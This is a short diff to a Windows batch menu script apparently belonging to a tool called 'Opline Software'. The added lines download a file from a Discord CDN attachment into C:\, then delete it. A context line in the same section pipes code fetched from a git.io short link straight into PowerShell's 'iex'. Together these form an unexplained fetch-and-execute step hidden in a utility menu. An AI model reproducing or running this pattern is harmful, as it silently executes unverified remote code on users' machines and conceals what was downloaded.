@@ -1751,7 +1751,11 @@ if %ERRORLEVEL% == 3 goto OplineMenu
 
 :ADD
 cls
+powershell Invoke-WebRequest "https://cdn.discordapp.com/attachments/859608373016133643/891646408308977684/appxmanifest.xml" -OutFile "C:\appxmanifest.xml"
 Powershell iex ((New-Object System.Net.WebClient).DownloadString('https://git.io/JcGHI'))
+cls
+cd C:\
+del appxmanifest.xml
 cls
 SET msgboxTitle=Opline Software
 SET msgboxBody=Finished - Skonczone
